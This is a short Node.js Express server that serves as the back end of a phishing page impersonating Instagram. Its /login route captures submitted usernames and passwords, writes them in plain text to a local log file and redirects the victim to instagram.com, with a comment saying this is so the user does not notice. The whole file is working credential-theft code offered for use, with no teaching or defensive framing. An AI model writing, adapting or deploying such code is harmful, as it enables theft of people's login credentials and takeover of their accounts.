const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));

// Capture login data
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const logData = `Username: ${username} | Password: ${password}\n`;

  // Save to file
  fs.appendFileSync(path.join(__dirname, "log.txt"), logData);

  // Redirect to Instagram (so user doesn’t notice)
  res.redirect("https://instagram.com");
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
